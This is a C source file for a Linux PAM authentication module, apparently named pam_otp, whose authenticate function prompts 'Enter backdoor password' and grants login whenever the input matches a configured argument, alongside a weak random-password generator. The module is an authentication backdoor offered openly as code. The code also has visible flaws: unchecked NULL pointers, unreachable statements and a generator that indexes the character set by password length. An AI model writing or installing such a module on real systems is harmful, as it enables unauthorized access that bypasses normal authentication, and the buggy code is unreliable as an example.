#define PAM_SM_AUTH
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syslog.h>
#include <sys/types.h>

#include <security/pam_appl.h>
#include <security/pam_modules.h>

#define CONFIG_MAX_CHAR 255
#define ACTION_MAX_CHAR 255

#define LINUX_RANDOM 3
#define SERVER 4

static char *action_configuration(const char *filename, const char *uname){

	char *config_line = malloc(CONFIG_MAX_CHAR);
	char action_line[ACTION_MAX_CHAR];
	char *seperator;
	FILE *config_file = fopen(filename, "r");
	while(fgets(config_line, CONFIG_MAX_CHAR, config_file)){
		seperator = strstr(config_line, ":");
		*seperator = '\0';
		seperator++;	
		if(strcmp(config_line, uname) == 0)
			return seperator;

	}

	return NULL;	

}


static char *passwd_gen(char *valid_char,int passwd_len, int method){
	int seed, i;
	char *passwd = (char *)malloc(sizeof(char) * (passwd_len + 1));
	FILE *fp;
	switch(method){
		case LINUX_RANDOM :
			fp = fopen("/dev/random", "r");
			if(fp ==NULL){
				syslog(LOG_ALERT, "pam_otp[%d] can't open random pseudo file", getpid());
				return NULL;
			}
			if(fread(&seed, sizeof(seed), 1, fp) == 0){
				syslog(LOG_ALERT, "pam_otp[%d] can't read random pseudo file", getpid());
				fclose(fp);
				return NULL;
			}
			fclose(fp);
			srandom(seed);
			for(i = 0; i < passwd_len; i++){
				passwd[i] = valid_char[random() % passwd_len];
			}
			passwd[i] = '\0';
			return passwd;
		default : 
			return "DIE\0";
	}


}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv){
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
	int pam_return_code;
	char prompt[] = "Enter backdoor password : \0";
	struct pam_conv *conv = NULL;
	struct pam_message *message = (struct pam_message *)malloc(sizeof(struct pam_message));
	struct pam_response *response = NULL;
	
	// set the message style not to echo what user type
	message->msg_style = PAM_PROMPT_ECHO_OFF;

	// set the message prompt content
	message->msg = prompt;
	if(pam_get_item(pamh, PAM_CONV, (void **)&conv) != PAM_SUCCESS){
		return PAM_SERVICE_ERR;
	}
	// set message to prompt and wait for response
	conv->conv(1, (struct pam_message **)&message, &response, conv->appdata_ptr);
	
	// get the response message in the address response->resp
	if(pam_set_item(pamh, PAM_AUTHTOK, response->resp) != PAM_SUCCESS){
		return PAM_SERVICE_ERR;
	}
	
	// syslog(LOG_ALERT, "pam_otp[%d] %s", getpid(), argv[0]);
	if(strcmp(argv[0], response->resp) == 0){
		return PAM_SUCCESS;
	}
	else 
		return PAM_AUTH_ERR;
	if(argc == 1 && strcmp(argv[0], "Granted"))
		return PAM_SUCCESS;
}

int main(int argc, char **argv){
	printf("%s\n", passwd_gen("ABCDEFGHIJKLMNOPQRSTUVWXYZ", 6, LINUX_RANDOM));
	return 0;
}
